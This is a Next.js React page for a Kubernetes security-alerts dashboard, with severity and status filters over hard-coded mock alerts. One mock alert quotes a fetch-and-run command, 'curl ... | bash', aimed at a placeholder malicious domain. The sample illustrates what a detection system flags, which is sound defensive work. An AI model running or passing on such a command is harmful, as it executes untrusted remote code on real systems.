'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import {
  Card,
  CardContent,
  CardHeader,
} from "@/components/ui/card";
import {
  Button,
} from "@/components/ui/button";
import {
  Select,
  SelectTrigger,
  SelectValue,
  SelectContent,
  SelectItem,
} from "@/components/ui/select";
import {
  Table,
  TableHeader,
  TableRow,
  TableHead,
  TableBody,
  TableCell,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { AlertCircle, AlertTriangle, Info } from "lucide-react";
import { Label } from '@/components/ui/label';

const mockAlerts = [
  {
    id: "alert-1",
    timestamp: "2025-04-05T13:45:12Z",
    title: "Privilege Escalation Attempt",
    description: "Detected attempt to escalate privileges in pod nginx-pod-1",
    severity: "critical",
    status: "new",
    podName: "nginx-pod-1",
    namespace: "default",
    nodeName: "worker-1"
  },
  {
    id: "alert-2",
    timestamp: "2025-04-05T13:30:45Z",
    title: "Suspicious Network Activity",
    description: "Unusual outbound connection from pod redis-pod-2",
    severity: "high",
    status: "acknowledged",
    podName: "redis-pod-2",
    namespace: "default",
    nodeName: "worker-2"
  },
  {
    id: "alert-3",
    timestamp: "2025-04-05T12:15:22Z",
    title: "Sensitive File Access",
    description: "Attempt to access sensitive file /etc/kubernetes/pki/ca.key",
    severity: "high",
    status: "new",
    podName: "etcd-backup-job-1",
    namespace: "kube-system",
    nodeName: "master-1"
  },
  {
    id: "alert-4",
    timestamp: "2025-04-05T11:05:18Z",
    title: "Suspicious Process Execution",
    description: "Unusual process execution in container: curl -s https://malicious-domain.com/script.sh | bash",
    severity: "medium",
    status: "new",
    podName: "web-app-3",
    namespace: "app",
    nodeName: "worker-3"
  },
  {
    id: "alert-5",
    timestamp: "2025-04-05T10:30:05Z",
    title: "Container Escape Attempt",
    description: "Potential container escape attempt detected from pod monitoring-agent-2",
    severity: "critical",
    status: "acknowledged",
    podName: "monitoring-agent-2",
    namespace: "monitoring",
    nodeName: "worker-1"
  },
  {
    id: "alert-6",
    timestamp: "2025-04-04T23:45:30Z",
    title: "Crypto Mining Activity",
    description: "Potential crypto mining process detected in container",
    severity: "medium",
    status: "resolved",
    podName: "batch-job-15",
    namespace: "batch",
    nodeName: "worker-2"
  },
  {
    id: "alert-7",
    timestamp: "2025-04-04T22:10:15Z",
    title: "Suspicious Shell Execution",
    description: "Interactive shell spawned in container that typically doesn't require it",
    severity: "medium",
    status: "false_positive",
    podName: "debug-pod-1",
    namespace: "dev",
    nodeName: "worker-3"
  }
];

const AlertsPage = () => {
  const router = useRouter();
  const [severityFilter, setSeverityFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');

  const filteredAlerts = mockAlerts.filter(alert => {
    const matchesSeverity = severityFilter === 'all' || alert.severity === severityFilter;
    const matchesStatus = statusFilter === 'all' || alert.status === statusFilter;
    return matchesSeverity && matchesStatus;
  });

  const getSeverityColor = (severity: string): "default" | "destructive" | "secondary" | "outline" => {
    switch (severity) {
      case 'critical':
      case 'high': return 'destructive';
      case 'medium': 
      case 'low': return 'secondary';
      default: return 'default';
    }
  };

  const getStatusVariant = (status: string): "default" | "destructive" | "secondary" | "outline" => {
    switch (status) {
      case 'new': return 'destructive';
      case 'acknowledged': 
      case 'resolved':
      case 'false_positive': return 'secondary';
      default: return 'default';
    }
  };

  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case 'critical':
      case 'high': return <AlertCircle className="h-4 w-4 text-red-500" />;
      case 'medium': return <AlertTriangle className="h-4 w-4 text-yellow-500" />;
      case 'low': return <Info className="h-4 w-4 text-blue-500" />;
      default: return <Info className="h-4 w-4 text-muted-foreground" />;
    }
  };

  return (
    <div className="p-6 space-y-4">
      <h1 className="text-3xl font-semibold">Security Alerts</h1>

      <div className="flex gap-4">

        <div>
        <Label className='mb-1 text-xs text-muted-foreground'>Filter by severity</Label>
        <Select  onValueChange={setSeverityFilter} defaultValue="all">
          <SelectTrigger className="w-[180px]">
            <SelectValue placeholder="Severity" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All</SelectItem>
            <SelectItem value="critical">Critical</SelectItem>
            <SelectItem value="high">High</SelectItem>
            <SelectItem value="medium">Medium</SelectItem>
            <SelectItem value="low">Low</SelectItem>
          </SelectContent>
        </Select>
        </div>

        <div>
        <Label className='mb-1 text-xs text-muted-foreground'>Filter by status</Label>
        <Select onValueChange={setStatusFilter} defaultValue="all">
          <SelectTrigger className="w-[180px]">
            <SelectValue placeholder="Status" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All</SelectItem>
            <SelectItem value="new">New</SelectItem>
            <SelectItem value="acknowledged">Acknowledged</SelectItem>
            <SelectItem value="resolved">Resolved</SelectItem>
            <SelectItem value="false_positive">False Positive</SelectItem>
          </SelectContent>
        </Select>
        </div>
      </div>

      <Card>
        <CardHeader>
          <h2 className="text-xl font-medium">Alerts Table</h2>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Severity</TableHead>
                <TableHead>Title</TableHead>
                <TableHead>Status</TableHead>
                <TableHead>Pod</TableHead>
                <TableHead>Namespace</TableHead>
                <TableHead>Time</TableHead>
                <TableHead>Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredAlerts.map((alert) => (
                <TableRow key={alert.id}>
                  <TableCell>
                    <div className="flex items-center gap-2">
                      {getSeverityIcon(alert.severity)}
                      <Badge variant={getSeverityColor(alert.severity)}>
                        {alert.severity}
                      </Badge>
                    </div>
                  </TableCell>
                  <TableCell>{alert.title}</TableCell>
                  <TableCell>
                    <Badge variant={getStatusVariant(alert.status)}>
                      {alert.status}
                    </Badge>
                  </TableCell>
                  <TableCell>{alert.podName}</TableCell>
                  <TableCell>{alert.namespace}</TableCell>
                  <TableCell>{new Date(alert.timestamp).toLocaleString()}</TableCell>
                  <TableCell>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => router.push(`/dashboard/alerts/${alert.id}`)}
                    >
                      Details
                    </Button>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
};

export default AlertsPage;